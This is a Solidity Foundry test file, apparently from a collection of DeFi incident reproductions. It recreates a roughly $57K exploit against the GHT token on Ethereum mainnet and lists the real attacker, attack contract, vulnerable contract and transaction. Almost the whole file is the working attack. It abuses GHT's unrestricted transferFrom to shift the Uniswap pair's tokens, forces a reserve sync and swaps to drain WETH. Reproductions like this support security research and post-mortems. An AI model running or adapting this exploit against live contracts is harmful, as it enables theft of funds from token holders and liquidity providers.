// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : ~$57K
// Attacker : https://etherscan.io/address/0x096f0f03e4be68d7e6dd39b22a3846b8ce9849a3
// Attack Contract : https://etherscan.io/address/0xcc5159b5538268f45afda7b5756fa8769ce3e21f
// Vuln Contract : https://etherscan.io/address/0x528e046acfb52bd3f9c400e7a5c79a8a2c2863d0
// Attack Tx : https://phalcon.blocksec.com/explorer/tx/eth/0xd17266bcdf30cbcbd7d0b5a006f43141981aeee2e1f860f68c9a1805ecacbc68?line=3
interface IGHT {

    function transferFrom(address, address, uint256) external;
    function balanceOf(address) external view returns (uint256);

}

contract ContractTest is Test {

    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IGHT private constant GHT = IGHT(0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0);
    IUniswapV2Pair private constant WETH_GHT = IUniswapV2Pair(0x706206EabD6A70ca4992eEc1646B6D1599259CAe);

    function setUp() public {
        vm.label(address(WETH), "WETH");
        vm.label(address(GHT), "GHT");
        vm.label(address(WETH_GHT), "WETH_GHT");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "Exploiter WETH balance before attack", WETH.balanceOf(address(this)), WETH.decimals()
        );
        uint256 amount = GHT.balanceOf(address(WETH_GHT));
        GHT.transferFrom(address(WETH_GHT), address(GHT), amount - 1);
        WETH_GHT.sync();
        amount = GHT.balanceOf(address(GHT));
        GHT.transferFrom(address(GHT), address(WETH_GHT), amount);
        uint256 balance = GHT.balanceOf(address(WETH_GHT));
        (uint256 reserveIn, uint256 reserveOut,) = WETH_GHT.getReserves();
        uint256 amountIn = balance - reserveIn;
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = reserveIn * 1000 + amountInWithFee;
        uint256 amountOut = numerator / denominator;

        WETH_GHT.swap(0, amountOut, address(this), "");
        emit log_named_decimal_uint(
            "Exploiter WETH balance after attack", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }

}
